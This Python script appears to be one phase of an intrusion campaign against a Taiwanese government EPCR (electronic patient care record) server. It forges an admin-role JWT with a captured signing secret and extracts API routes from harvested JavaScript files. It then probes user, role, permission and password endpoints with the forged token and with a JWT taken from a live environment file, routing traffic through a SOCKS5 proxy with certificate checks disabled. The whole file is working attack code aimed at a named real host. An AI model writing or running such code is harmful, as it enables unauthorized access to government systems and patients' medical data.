#!/usr/bin/env python3
"""Phase 61: Extract EPCR API endpoints from route config + test with JWT."""
import sys
sys.path.insert(0, '/usr/lib/python3/dist-packages')
import requests, urllib3, json, re, base64, hmac, hashlib, time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PROXY = {'https': 'socks5://202.160.76.154:11085', 'http': 'socks5://202.160.76.154:11085'}
JWT_SECRET = "***"

# Forge JWT
def base64url_encode(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('ascii')

def forge_jwt(payload_dict, secret):
    header = {"alg": "HS256", "typ": "JWT"}
    header_b64 = base64url_encode(json.dumps(header, separators=(',', ':')).encode())
    payload_b64 = base64url_encode(json.dumps(payload_dict, separators=(',', ':')).encode())
    message = header_b64 + "." + payload_b64
    signature = hmac.new(secret.encode(), message.encode(), hashlib.sha256).digest()
    sig_b64 = base64url_encode(signature)
    return message + "." + sig_b64

now = int(time.time())
admin_jwt = forge_jwt({"sub": "1", "role": "ADMIN", "permissions": ["ADMIN"], "iat": now, "exp": now + 3600, "jti": "admin"}, JWT_SECRET)

# Read all auth server JS files to find routes
import os
auth_dir = '/mnt/c/Users/Administrator/desktop/JySecAI/tpe119_evidence/epcr_auth_server'
routes = set()
for fname in os.listdir(auth_dir):
    if fname.endswith('.js'):
        fpath = os.path.join(auth_dir, fname)
        with open(fpath, 'r', errors='replace') as f:
            content = f.read()
        # Find route patterns: $routeProvider.when('/path', ...), $state... .when('...',
        found = re.findall(r"""[\'"]/(?:[a-zA-Z0-9_\-/{}]+)[\'"]""", content)
        for r in found:
            routes.add(r.strip('"\''))

# Also check for API URLs
api_urls = set()
for fname in os.listdir(auth_dir):
    if fname.endswith('.js'):
        fpath = os.path.join(auth_dir, fname)
        with open(fpath, 'r', errors='replace') as f:
            content = f.read()
        found = re.findall(r'[\'"]/api/[a-zA-Z0-9_\-/]+[\'"]', content)
        for r in found:
            api_urls.add(r.strip('"\''))

print(f"Found {len(routes)} routes and {len(api_urls)} API URLs")
print(f"Sample routes: {sorted(routes)[:30]}")
print(f"API URLs: {sorted(api_urls)[:30]}")

EPCR = "https://epcr.tpf.gov.tw:4004"
headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
    'Accept': 'application/json, text/plain, */*',
    'Authorization': f'Bearer {admin_jwt}',
    'Capapikey': 'test',
    'Token': admin_jwt,
}

# Show actual error responses
print("\n=== Detailed error responses ===")
for ep in ['/user', '/permission', '/role', '/login', '/changepassword']:
    r = requests.get(f'{EPCR}{ep}', proxies=PROXY, verify=False, timeout=10, headers=headers)
    print(f"  GET {ep}: {r.status_code}")
    print(f"    Body: {r.text[:500]}")
    print()

# Try with trailing slash
print("=== Trailing slash variants ===")
for ep in ['/user', '/permission']:
    r = requests.get(f'{EPCR}{ep}/', proxies=PROXY, verify=False, timeout=10, headers=headers)
    print(f"  GET {ep}/: {r.status_code}, len={len(r.text)}")
    if r.status_code == 200:
        print(f"    *** FOUND: {r.text[:500]}")

# Try with existing JWT too
print("\n=== Check existing JWT response ===")
with open('/mnt/c/Users/Administrator/desktop/JySecAI/tpe_service119_live.env', 'r') as f:
    env_content = f.read()
existing_jwt = re.findall(r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', env_content)

headers_existing = {
    'User-Agent': 'Mozilla/5.0',
    'Accept': 'application/json, text/plain, */*',
    'Authorization': f'Bearer {existing_jwt[0]}',
}

for ep in ['/user', '/permission', '/role']:
    r = requests.get(f'{EPCR}{ep}', proxies=PROXY, verify=False, timeout=10, headers=headers_existing)
    print(f"  GET {ep} (existing JWT): {r.status_code}")
    print(f"    Body: {r.text[:300]}")
